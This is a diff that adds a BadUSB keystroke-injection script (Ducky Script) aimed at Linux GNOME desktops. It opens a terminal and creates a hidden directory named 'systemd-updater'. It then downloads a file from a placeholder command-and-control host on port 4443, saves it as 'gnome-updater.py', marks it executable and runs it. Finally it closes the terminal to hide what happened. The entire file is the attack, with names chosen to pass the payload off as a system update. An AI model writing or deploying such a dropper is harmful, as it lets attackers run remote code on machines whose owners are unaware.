@@ -1,0 +1,19 @@
+$DEFAULT_DELAY_MS = 100
+$TERMINAL_OPEN_DELAY_MS = 2000
+
+DELAY 3000
+
+ALT F2
+STRING gnome-terminal
+
+STRING mkdir -p ~/.local/share/systemd-updater/ && cd ~/.local/share/systemd-updater/
+ENTER
+DELAY $DEFAULT_DELAY_MS
+
+STRING wget http://{C2-SERVER}:4443/security_debian_x386 -O gnome-updater.py && chmod +x gnome-updater.py && python3 gnome-updater.py
+ENTER
+DELAY $DEFAULT_DELAY_MS
+
+STRING exit
+ENTER
+DELAY $DEFAULT_DELAY_MS
